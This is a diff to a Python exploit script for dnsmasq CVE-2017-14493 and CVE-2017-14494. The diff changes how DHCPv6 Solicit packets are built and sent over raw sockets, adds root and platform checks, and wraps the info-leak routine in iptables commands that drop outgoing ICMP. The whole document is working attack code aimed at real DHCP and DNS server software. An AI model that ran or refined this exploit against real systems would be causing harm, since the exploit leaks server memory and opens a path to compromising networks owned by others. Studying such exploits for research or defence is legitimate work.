@@ -12,7 +12,7 @@ from tm import ThreadManager
 from time import sleep
 from binascii import unhexlify
 from ipaddress import IPv6Address
-from os import stat
+from os import stat, system
 from select import select
 from network import IPv6_raw, DHCPv6_raw
 
@@ -318,6 +318,8 @@ LEAK_BYTES = 0xFF00
 
 Base = Base()
 Base.print_banner()
+Base.check_platform()
+Base.check_user()
 
 parser = ArgumentParser(description='Exploit for dnsmasq CVE-2017-14493 and CVE-2017-14494')
 
@@ -492,37 +494,20 @@ def get_dhcpv6_server_duid():
 
 
 def send_dhcpv6_solicit():
-    sol = DHCP6_Solicit()
-    rc = DHCP6OptRapidCommit()
-    opreq = DHCP6OptOptReq()
-    et = DHCP6OptElapsedTime()
-    cid = DHCP6OptClientId()
-    iana = DHCP6OptIA_NA()
+    Client_DUID = dhcpv6r.get_client_duid(macsrc)
+    request_options = [23, 24]
 
-    rc.optlen = 0
-    opreq.optlen = 4
-    iana.optlen = 12
-    iana.T1 = 0
-    iana.T2 = 0
-    cid.optlen = 10
-    sol.trid = randint(0, 16777215)
-
-    eth.src = macsrc
-    eth.dst = "33:33:00:01:00:02"
-
-    ipv6.src = ipv6src_link
-    ipv6.dst = "ff02::1:2"
-
-    udp.sport = 546
-    udp.dport = 547
-
-    cid.duid = ("00030001" + str(EUI(macsrc)).replace("-", "")).decode("hex")
-
-    pkt = eth / ipv6 / udp / sol / iana / rc / et / cid / opreq
-
+    pkt = dhcpv6r.make_solicit_packet(ethernet_src_mac=macsrc,
+                                      ipv6_src=ipv6src_link,
+                                      transaction_id=randint(1, 16777215),
+                                      client_identifier=Client_DUID,
+                                      option_request_list=request_options)
     try:
-        sendp(pkt, iface=current_network_interface, verbose=False)
+        SOCK = socket(AF_PACKET, SOCK_RAW)
+        SOCK.bind((current_network_interface, 0))
+        SOCK.send(pkt)
         print Base.c_info + "Send Solicit request to: [ff02::1:2]:547"
+        SOCK.close()
     except:
         print Base.c_error + "Do not send Solicit request."
         exit(1)
@@ -758,6 +743,9 @@ def inner_pkg(duid):
 
 
 def info_leak():
+    # Add iptables rules to DROP icmp packets
+    system("iptables -A OUTPUT -p icmp -j DROP")
+
     # Receive info leak reply
     sock = socket(AF_INET6, SOCK_DGRAM)
     sock.setsockopt(SOL_SOCKET, SO_RCVBUF, LEAK_BYTES)
@@ -810,6 +798,9 @@ def info_leak():
         print Base.c_success + "Length info leak response: " + str(hex(info_leak_size))
     else:
         print Base.c_error + "Bad length of info leak response: " + str(hex(info_leak_size))
+
+    # Delete iptables rules to DROP icmp packets
+    system("iptables -D OUTPUT -p icmp -j DROP")
 
     print Base.c_info + "Dump info leak response to file: response.bin"
     sock.close()
